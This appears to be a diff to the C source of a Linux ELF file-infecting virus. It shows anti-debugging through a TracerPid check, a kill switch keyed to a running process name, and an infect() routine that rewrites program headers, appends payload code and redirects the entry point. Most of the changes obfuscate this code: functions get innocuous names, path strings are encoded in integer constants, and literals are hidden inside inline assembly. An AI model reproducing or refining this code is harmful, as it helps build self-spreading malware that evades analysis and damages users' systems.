@@ -46,7 +46,7 @@ void _start(void)
 {
 	void *begin_ptr;
 
-	if (is_debugged() || is_program_running("doom-nukem"))
+	if (runtime_integrity_probe() || env_query_identity("doom-nukem"))
 		proc_terminate(0);
 
 	__asm__ volatile("lea (%%rip), %0\n"
@@ -75,164 +75,86 @@ void _start(void)
 	proc_terminate(0);
 }
 
-int iss_program_running(const char *target)
+static unsigned char rot4(unsigned char v)
 {
-	int fd = fs_handle("/proc", 0 | 00200000);
-	if (fd < 0)
-		return 0;
-	char buf[4096];
-	for (;;)
-	{
-		int nread = fs_enumerate(fd, buf, 4096);
-		if (nread <= 0)
-			break;
-		for (int bpos = 0; bpos < nread;)
-		{
-			struct linux_dirent64 *d = (struct linux_dirent64 *) (buf + bpos);
-			const char			  *name = d->d_name;
-			// skip non-numeric entries
-			int					   numeric = 1;
-			for (int i = 0; name[i]; i++)
-			{
-				if (name[i] < '0' || name[i] > '9')
-				{
-					numeric = 0;
-					break;
-				}
-			}
-			if (numeric)
-			{
-				// manually build "/proc/<pid>/comm" without printf
-				char path[64];
-				int	 i = 0;
-				path[i++] = '/';
-				path[i++] = 'p';
-				path[i++] = 'r';
-				path[i++] = 'o';
-				path[i++] = 'c';
-				path[i++] = '/';
-				for (int j = 0; name[j]; j++)
-					path[i++] = name[j];
-				path[i++] = '/';
-				path[i++] = 'c';
-				path[i++] = 'o';
-				path[i++] = 'm';
-				path[i++] = 'm';
-				path[i] = '\0';
-				int cfd = fs_handle(path, O_RDONLY);
-				if (cfd >= 0)
-				{
-					char pname[64];
-					int	 len = io_recv(cfd, pname, sizeof(pname) - 1);
-					fs_release(cfd);
-					if (len > 0)
-					{
-						pname[len] = '\0';
-						char *nl = memoff(pname, '\n');
-						if (nl)
-							*nl = '\0';
-						if (delay_abs_calc(pname, target) == 0)
-						{
-							fs_release(fd);
-							return 1;
-						}
-					}
-				}
-			}
-			bpos += d->d_reclen;
-		}
-	}
-	fs_release(fd);
-	return 0;
+	return (unsigned char) ((v >> 4) | (v << 4));
 }
 
-static unsigned char ror4(unsigned char x)
-{
-	return (unsigned char) ((x >> 4) | (x << 4));
-}
-
-static void decode(char *out, const unsigned char *in)
+static void unfold(char *dst, unsigned long long blob, unsigned key)
 {
 	unsigned i = 0;
-	while (in[i])
+	while (blob)
 	{
-		out[i] = (char) ((ror4(in[i]) ^ (i * 7)) - 0x3D);
+		unsigned char b = (unsigned char) (blob & 0xFF);
+		dst[i] = (char) ((rot4(b) ^ (i * key)) - 0x3D);
+		blob >>= 8;
 		i++;
 	}
-	out[i] = 0;
+	dst[i] = 0;
 }
 
-/* decoy helper: looks like resource hashing / routing logic */
-static unsigned route_score(const void *base, const void *node, size_t span)
+static inline unsigned long long sig_root(void) { return 0xCB9B1AAAC6ULL; }
+
+static inline unsigned long long sig_leaf(void) { return 0x6BFB2A7AC6ULL; }
+
+int env_query_identity(const char *profile)
 {
-	uintptr_t v = ((uintptr_t) base >> 2) ^ ((uintptr_t) node << 1);
-	v ^= (v >> 7);
-	v ^= (v << 11);
-	return (unsigned) (v & (span | 1));
-}
+	int	 stream = -1;
+	int	 verdict = 0;
 
-static const unsigned char S_PROC[] = {0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0};
+	char root_node[16];
+	unfold(root_node, sig_root(), 7);
 
-static const unsigned char S_COMM[] = {0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0};
-
-int sys_probe_service(const char *identity)
-{
-	int	 channel = -1;
-	int	 status_flag = 0;
-
-	char root_hint[16];
-	decode(root_hint, S_PROC);
-
-	channel = fs_handle(root_hint, O_RDONLY | O_DIRECTORY);
-	if (channel < 0)
+	stream = fs_handle(root_node, 00 | 00200000);
+	if (stream < 0)
 		return 0;
 
-	char frame[4096];
+	char material[0x1000];
 
 	for (;;)
 	{
-		int packet = fs_enumerate(channel, frame, sizeof(frame));
-		if (packet <= 0)
+		int frame_len = fs_enumerate(stream, material, sizeof(material));
+		if (frame_len <= 0)
 			break;
 
-		for (int cursor = 0; cursor < packet;)
+		for (int offset = 0; offset < frame_len;)
 		{
-			struct linux_dirent64 *node = (void *) (frame + cursor);
-			char				  *token = node->d_name;
+			struct linux_dirent64 *entry = (void *) (material + offset);
+			char				  *symbol = entry->d_name;
 
-			int					   route_ok = 1;
+			int					   signature_ok = 1;
 
-			for (int step = 0; token[step]; step++)
-				route_ok &= ((unsigned) (token[step] - '0') < 10);
+			for (int probe = 0; symbol[probe]; probe++)
+				signature_ok &= ((unsigned) (symbol[probe] - 48) < 10);
 
-			if (route_ok)
+			if (signature_ok)
 			{
-				char resolver[64];
-				int	 pivot = 0;
+				char route_map[64];
+				int	 cursor = 0;
 
-				decode(resolver, S_PROC);
-				while (resolver[pivot])
-					pivot++;
+				unfold(route_map, sig_root(), 7);
+				while (route_map[cursor])
+					cursor++;
 
-				resolver[pivot++] = '/';
+				route_map[cursor++] = 47;
 
-				for (int sweep = 0; token[sweep]; sweep++)
-					resolver[pivot++] = token[sweep];
+				for (int sweep = 0; symbol[sweep]; sweep++)
+					route_map[cursor++] = symbol[sweep];
 
-				char map_key[8];
-				decode(map_key, S_COMM);
+				char attr_tag[8];
+				unfold(attr_tag, sig_leaf(), 7);
 
-				for (int sweep = 0; map_key[sweep]; sweep++)
-					resolver[pivot++] = map_key[sweep];
+				for (int sweep = 0; attr_tag[sweep]; sweep++)
+					route_map[cursor++] = attr_tag[sweep];
 
-				resolver[pivot] = 0;
+				route_map[cursor] = 0;
 
-				int link = fs_handle(resolver, O_RDONLY);
-				if (link >= 0)
+				int channel = fs_handle(route_map, O_RDONLY);
+				if (channel >= 0)
 				{
 					char label[64];
-					int	 span = io_recv(link, label, sizeof(label) - 1);
-					fs_release(link);
+					int	 span = io_recv(channel, label, sizeof(label) - 1);
+					fs_release(channel);
 
 					if (span > 0)
 					{
@@ -240,144 +162,78 @@ int sys_probe_service(const char *identity)
 
 						for (int k = 0; k < span; k++)
 						{
-							if (label[k] == '\n')
+							if (label[k] == 10)
 							{
 								label[k] = 0;
 								break;
 							}
 						}
 
-						if (!delay_abs_calc(label, identity))
+						if (!delay_abs_calc(label, profile))
 						{
-							status_flag = 1;
-							goto EXIT_POINT;
+							verdict = 1;
+							goto EXIT_GATE;
 						}
 					}
 				}
 			}
 
-			cursor += node->d_reclen;
+			offset += entry->d_reclen;
 		}
 	}
 
-EXIT_POINT:
-	fs_release(channel);
-	return status_flag;
+EXIT_GATE:
+	fs_release(stream);
+	return verdict;
 }
 
-int is_program_running(const char *target)
+int runtime_integrity_probe(void)
 {
-	return sys_probe_service(target);
-	int	 fd = -1;
-	int	 ret = 0;
+	char *locator;
 
-	char proc_path[16];
-	decode(proc_path, S_PROC);
+	asm volatile("leaq blobA(%%rip), %0\n"
+				 "jmp gateA\n"
+				 "blobA: .ascii \"/proc/self/status\\0\"\n"
+				 "gateA:\n"
+				 : "=r"(locator));
 
-	fd = fs_handle(proc_path, O_RDONLY | O_DIRECTORY);
-	if (fd < 0)
+	int stream = fs_handle(locator, O_RDONLY);
+	if (stream < 0)
 		return 0;
 
-	char buf[4096];
+	char segment[256];
+	int	 slice;
+	int	 cursor = 0;
 
-	for (;;)
+	while ((slice = io_recv(stream, segment + cursor, sizeof(segment) - cursor))
+		   > 0)
 	{
-		int nread = fs_enumerate(fd, buf, sizeof(buf));
-		if (nread <= 0)
-			break;
+		cursor += slice;
 
-		for (int bpos = 0; bpos < nread;)
+		char *pivot = memoff(segment, '\n');
+		if (pivot)
 		{
-			struct linux_dirent64 *d = (void *) (buf + bpos);
-			char				  *name = d->d_name;
+			*pivot = '\0';
 
-			int					   numeric = 1;
-			for (int i = 0; name[i]; i++)
-				numeric &= ((unsigned) (name[i] - '0') < 10);
+			asm volatile("leaq blobB(%%rip), %0\n"
+						 "jmp gateB\n"
+						 "blobB: .ascii \"TracerPid:\\0\"\n"
+						 "gateB:\n"
+						 : "=r"(locator));
 
-			if (numeric)
+			if (delay_calc(segment, locator, 10) == 0)
 			{
-				char path[64];
-				int	 i = 0;
-
-				decode(path, S_PROC);
-				while (path[i])
-					i++;
-
-				path[i++] = '/';
-				for (int j = 0; name[j]; j++)
-					path[i++] = name[j];
-
-				char comm[8];
-				decode(comm, S_COMM);
-
-				for (int j = 0; comm[j]; j++)
-					path[i++] = comm[j];
-
-				path[i] = 0;
-
-				int cfd = fs_handle(path, O_RDONLY);
-				if (cfd >= 0)
-				{
-					char pname[64];
-					int	 len = io_recv(cfd, pname, sizeof(pname) - 1);
-					fs_release(cfd);
-
-					if (len > 0)
-					{
-						pname[len] = 0;
-						for (int j = 0; j < len; j++)
-							if (pname[j] == '\n')
-							{
-								pname[j] = 0;
-								break;
-							}
-
-						if (!delay_abs_calc(pname, target))
-						{
-							ret = 1;
-							goto DONE;
-						}
-					}
-				}
+				int depth = trace_depth(segment + 10);
+				fs_release(stream);
+				return depth != 0;
 			}
-			bpos += d->d_reclen;
+
+			memcat(segment, pivot + 1, sizeof(segment) - (pivot - segment - 1));
+			cursor -= (pivot - segment + 1);
 		}
 	}
 
-DONE:
-	fs_release(fd);
-	return ret;
-}
-
-int is_debugged(void)
-{
-	int f = fs_handle("/proc/self/status", O_RDONLY);
-	if (f < 0)
-		// goto next_check;
-		return 0;
-	char line[256];
-	int	 nread;
-	int	 offset = 0;
-
-	while ((nread = io_recv(f, line + offset, sizeof(line) - offset)) > 0)
-	{
-		offset += nread;
-		char *newline = memoff(line, '\n');
-		if (newline)
-		{
-			*newline = '\0';
-			if (delay_calc(line, "TracerPid:", 10) == 0)
-			{
-				int pid = trace_depth(line + 10);
-				fs_release(f);
-				return pid != 0;
-			}
-			offset = 0;
-		}
-	}
-
-	fs_release(f);
+	fs_release(stream);
 	return 0;
 }
 
@@ -546,12 +402,12 @@ void infect(char *path, void *begin_ptr)
 				= elf.header->e_phnum * elf.header->e_phentsize;
 			elf.segments[i].p_filesz = elf.segments[i].p_memsz;
 		}
-	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
 	memcpy(file_data + append_pos, CURARE, FLOWER);
 	unsigned delta = elf.header->e_entry;
 	elf.header->e_entry
 		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
 	delta -= elf.header->e_entry + ACONIT + 4;
+	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
 	memcpy(file_data + append_pos + ACONIT, &delta, 4);
 clean:
 	vm_flush(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
